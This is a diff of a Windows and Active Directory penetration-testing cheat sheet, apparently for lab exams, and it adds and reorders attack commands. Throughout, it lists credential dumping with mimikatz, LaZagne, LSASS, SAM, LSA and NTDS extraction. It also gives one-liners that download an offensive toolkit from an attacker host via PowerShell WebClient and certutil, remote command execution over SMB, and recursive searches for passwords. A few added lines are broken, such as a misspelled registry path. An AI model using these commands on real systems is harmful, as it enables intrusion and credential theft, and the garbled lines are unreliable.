@@ -60,6 +60,7 @@ Group Enum:net group /domain # List domain groups; target-machine
 Group Enum:net group "Domain Admins" /domain # List Domain Admins; target-machine
 Group Enum:net group "Enterprise Admins" /domain # List Enterprise Admins; target-machine
 Group Enum:Get-LocalGroup # PowerShell: list local groups; target-machine
+Group Enum:Get-LocalGroup | FT -AutoSize #enumerate local groups; target-machine
 Group Enum:Get-LocalGroupMember Administrators # PowerShell: list Admin group members; target-machine
 Network Enum:ipconfig /all # Get network configuration including DNS and DHCP; target-machine
 Network Enum:netstat -ano # List all connections and listening ports with PIDs; target-machine
@@ -92,12 +93,13 @@ Service Enum:Get-CimInstance -ClassName win32_service | Select Name,State,PathNa
 Service Enum:wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v """ # spot services running outside system dirs (more likely writable); target-machine
 Scheduled Tasks:schtasks /query /fo LIST /v # List all scheduled tasks with details; target-machine
 Scheduled Tasks:schtasks /query /fo CSV /v > tasks.csv # Export tasks to CSV; target-machine
-Scheduled Tasks (cmd.exe): schtasks /query /fo LIST /v # enumerate scheduled tasks for creds, scripts, writable paths; target-machine
-Scheduled Tasks (powershell.exe): Get-ScheduledTask # list scheduled tasks/actions in PowerShell for easier parsing; target-machine
-Scheduled Tasks:Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "*Microsoft*"} # PowerShell list non-Microsoft tasks; target-machine
-Scheduled Tasks:Get-ScheduledTask | Select TaskName, TaskPath, State, Actions # PowerShell task details; target-machine
-Scheduled Tasks:accesschk.exe -dqv "C:\Windows\Tasks" # Check Tasks folder permissions; target-machine
-Check installed apps:Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname # list 32-bit installed apps; target-machine
+Scheduled Tasks: schtasks /query /fo LIST /v # cmd.exe - enumerate scheduled tasks for creds, scripts, writable paths; target-machine
+Scheduled Tasks: Get-ScheduledTask # list scheduled tasks/actions in PowerShell for easier parsing; target-machine
+Scheduled Tasks: Get-ScheduledTask | select -first 60 | FT -AutoSize #enumerate scheduled tasks; target-machine
+Scheduled Tasks: Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "*Microsoft*"} # PowerShell list non-Microsoft tasks; target-machine
+Scheduled Tasks: Get-ScheduledTask | Select TaskName, TaskPath, State, Actions # PowerShell task details; target-machine
+Scheduled Tasks: accesschk.exe - (powershell.exe)dqv "C:\Windows\Tasks" # Check Tasks folder permissions; target-machine
+Check installed apps:Get-ItemProperty "HKLM:\SOTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname # list 32-bit installed apps; target-machine
 Check installed apps:Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname # list 64-bit installed apps; target-machine
 AppLocker (view policy):Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections # view AppLocker policy; target-machine
 AppLocker (detailed view):Get-AppLockerPolicy -Effective | ConvertFrom-AppLockerPolicy | % {$_.RuleCollections} # detailed view; target-machine
@@ -337,8 +339,9 @@ LaZagne:.\laZagne.exe databases # Extract database passwords; target-machine
 LaZagne:.\laZagne.exe sysadmin # Extract system admin passwords; target-machine
 Browser Passwords:.\laZagne.exe browsers # Run LaZagne to extract browser passwords; target-machine
 Browser Passwords:python3 laZagne.py browsers # Python version; target-machine
-^Privesc Toolkit:powershell.exe -c "$u='http://<kali>:<kaliPort>/';'PrivescCheck.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe'|%{(New-Object Net.WebClient).DownloadFile($u+$_,$_)}" # Download complete privesc toolkit via WebClient; target-machine
-Privesc Toolkit:cmd.exe /c "for %f in (GodPotato-NET4.exe nc64.exe PrintSpoofer64.exe SharpGPOAbuse.exe LaZagne.exe PowerUp.ps1 PrivescCheck.ps1 SeManageVolumeExploit.exe winPEASany_ofs.exe PowerView.ps1 Rubeus.exe mimikatz.exe) do certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/%f %f" # Download toolkit with certutil when PowerShell restricted; target-machine
+^Privesc Toolkit:powershell.exe -c "$u='http://<kali>:<kaliPort>/';'PrivescCheck.ps1','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe'|%{(New-Object Net.WebClient).DownloadFile($u+$_,$_)}" # Download complete privesc toolkit via WebClient; target-machine
+Privesc Toolkit:File Download:$u='http://<kali>:<kaliPort>/'; 'PrivescCheck.ps1','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe' | ForEach-Object {(New-Object Net.WebClient).DownloadFile($u+$_,$_)} #download multiple tools from attacker web server using PowerShell WebClient loop; target-machine
+Privesc Toolkit:cmd.exe /c "for %f in (GodPotato-NET4.exe SharpHound.ps1 nc64.exe PrintSpoofer64.exe SharpGPOAbuse.exe LaZagne.exe PowerUp.ps1 PrivescCheck.ps1 SeManageVolumeExploit.exe winPEASany_ofs.exe PowerView.ps1 Rubeus.exe mimikatz.exe) do certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/%f %f" # Download toolkit with certutil when PowerShell restricted; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "whoami /priv" -domain <domain> -b #execute command as another domain user and enumerate privileges (check for SeDebugPrivilege) before attempting UAC bypass; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" -domain <domain> -b #execute command as another domain user using RunasCs with logon bypass to dump credentials via mimikatz; target-machine
 Run command as <user> using RunasCs:# copy /home/kali/Tools/git-tools/RunasCs/Invoke-RunasCs.ps1 to target-machine
@@ -358,22 +361,28 @@ PSCredential (Powershell)-fragile:$password = ConvertTo-SecureString "<password>
 PSCredential (Powershell)-fragile:$cred = New-Object System.Management.Automation.PSCredential("<user>", $password) # build PSCredential object; target-machine
 PSCredential (Powershell)-fragile:Enter-PSSession -ComputerName <target hostname> -Credential $cred # PowerShell remoting interactive session; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --shares # List SMB shares; kali-machine
+NXC Enum:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --sessions # List active sessions; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --users # List domain users; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --loggedon-users # enumerate users currently logged on to the target via SMB; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --groups # List domain groups; kali-machine
+NXC Enum:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth # Local auth with NTLM; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --local-auth --sam # Dump local SAM; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --local-auth --lsa # Dump LSA secrets; kali-machine
+NXC Enum:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --disks # List disks; kali-machine
+NXC Enum:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --pass-pol # Get password policy; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' -M lsassy # Dump LSASS with lsassy; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' -M nanodump # Dump LSASS with nanodump; kali-machine
 NXC Enum:nxc smb <target> -u '<user>' -p '<password>' --spider 'C$' --pattern . #recursively enumerate files in the C$ admin share and list all accessible files/directories using spider module; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=True # Download all accessible files; kali-machine
 NXC Enum:nxc smb <target> -u <user> -p '<password>' --ntds # dump NTDS.dit hashes from domain controller via SMB (requires admin/DC privileges); kali-machine
-NXC Enum:nxc winrm <target> -u <user> -p '<password>' --verbose # Test WinRM access; kali-machine
+NXC Enum:nxc smb <target> -u <user> -p '<password>' -x "cmd /c dir C:\ /R" # remote ADS enumeration via SMB exec
+NXC Enum:nxc smb <target> -u <user> -p '<password>' -d <domain> -x "ipconfig & hostname" #execute basic enumeration commands across SMB targets; kali-machine
+NXC Enum:nxc smb <target> -u <user> -p '<password>' -d <domain> -x "for %f in (local.txt proof.txt) do @for /f \"delims=\" %i in ('dir C:\\Users\\%f /s /b 2^>nul') do @echo File: %i & type \"%i\"" #search and print loot files across hosts; kali-machine
+NXC Enum:nxc rdp <target> -u <user> -p '<password>' --verbose # validate creds against RDP and gather info
 NXC Enum:nxc rdp <target> -u <user> -p '<password>' --verbose # Test RDP access; kali-machine
+NXC Enum:nxc winrm <target> -u <user> -p '<password>' --verbose # validate creds for WinRM remote shell
+NXC Enum:nxc winrm <target> -u <user> -p '<password>' --verbose # Test WinRM access; kali-machine
 NXC Enum:nxc wmi <target> -u <user> -p '<password>' --verbose # Test WMI access; kali-machine
-nxc:nxc smb <target> -u <user> -p '<password>' -x "cmd /c dir C:\ /R" # remote ADS enumeration via SMB exec
-nxc:nxc rdp <target> -u <user> -p '<password>' --verbose # validate creds against RDP and gather info
-nxc:nxc winrm <target> -u <user> -p '<password>' --verbose # validate creds for WinRM remote shell
 Evil-WinRM:evil-winrm -i <target> -u <user> -p '<password>' # Connect via WinRM with password; kali-machine
 Evil-WinRM:evil-winrm -i <target> -u <user> -H '<ntlm>' # Connect via WinRM with NTLM hash; kali-machine
 Evil-WinRM:evil-winrm -i <target> -u '<domain>\<user>' -p '<password>' # Connect with domain user; kali-machine
@@ -405,6 +414,7 @@ loot:%WINDIR%\Panther\Unattend.xml # check Panther deployment logs for creds/set
 loot:dir c:*vnc.ini /s /b # hunt VNC config files across C: (may store passwords); target-machine
 loot:dir c:*ultravnc.ini /s /b # hunt UltraVNC config files across C: (may store passwords); target-machine
 loot:dir c:\ /s /b | findstr /si vnc.ini # filter filesystem listing for VNC configs; target-machine
+loot:Get-ChildItem C:\ -Recurse -EA SilentlyContinue | Select-String "password\|pwd\|secret\|token\|cred" | select -first 200 | FL #search Windows filesystem for credentials; target-machine
 loot:gci C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.env,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -EA 0 | ? {$_.FullName -notmatch 'Windows'} | sls 'pwd=','password=','username=','user=','pass=','<user>','<user>'
 loot:Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "<user>", "<user>", "<user>" # recursive sensitive-file keyword hunting outside Windows directory (configs, creds, names); target-machine
 loot:Get-ChildItem -Path C:\ -Recurse -Force -Include *.xml,*.bak,*.txt,*.ps1,*.log,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows|C:\\Program Files\\|C:\\ProgramData\\' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "<user>", "<user>", "<user>" # aggressive credential and user-string search excluding common system directories; target-machine
